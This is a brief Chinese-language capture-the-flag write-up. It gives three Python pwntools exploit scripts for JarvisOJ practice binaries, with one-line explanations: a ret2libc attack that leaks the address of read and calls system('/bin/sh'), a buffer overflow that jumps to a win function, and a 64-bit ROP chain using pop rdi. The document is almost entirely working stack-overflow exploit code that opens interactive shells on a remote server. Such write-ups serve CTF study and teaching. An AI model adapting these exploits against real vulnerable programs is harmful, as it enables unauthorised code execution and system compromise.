# write up 0712

## [XMAN]level3

栈溢出，题目给出了libc库，通过泄露read函数的地址得到system和/bin/sh的地址进行调用  

不知道为什么本地打的时候就出不来，打远程的时候就可以了

exp:

```python
 from pwn import *

#context.log_level = 'debug'

#n = process('./level3')
n = remote('pwn2.jarvisoj.com', 9879)
#n = remote("localhost",12345)

elf = ELF('./level3')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc-2.19.so')

offset = 0x8c

read_got = elf.got['read']
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vulnerable_function']

payload1 = 'a' * offset + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(read_got) + p32(4)

n.recvuntil("Input:\n")
n.sendline(payload1)

read_addr = u32(n.recv(4))

libcbase = read_addr - libc.symbols['read']

sys_addr = libcbase + libc.symbols['system']
sh_addr = libcbase + libc.search("/bin/sh").next()

n.recvuntil('Input:\n')
payload2 = 'a' * offset + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
n.sendline(payload2)
n.interactive()

```



## Test Your Memory

### exp:

```python
from pwn import *

n = remote('pwn2.jarvisoj.com', 9876)
#n = process('./memory')
elf = ELF('./memory')

win_func_addr = 0x080485BD
cat_flag_addr = 0x080487E0

offset = 0x13 + 4

n.recv()
payload = 'a' * offset + p32(win_func_addr) + p32(cat_flag_addr) *2
n.sendline(payload)
n.interactive()
```



## [XMAN]level2_x64

### 分析：

跟level2差不多，不过64位的参数是通过寄存器传递的

exp:

```python
from pwn import *

n = remote('pwn2.jarvisoj.com',9882)
#n = process('./level2_x64')
elf = ELF('./level2_x64')

sys_plt = elf.plt['system']
sh_addr = elf.search('/bin/sh').next()

pop_rdi_ret_addr = 0x00000000004006b3

offset = 0x88

payload = 'a' * offset + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(sys_plt)

n.recv()
n.sendline(payload)
n.interactive()
```

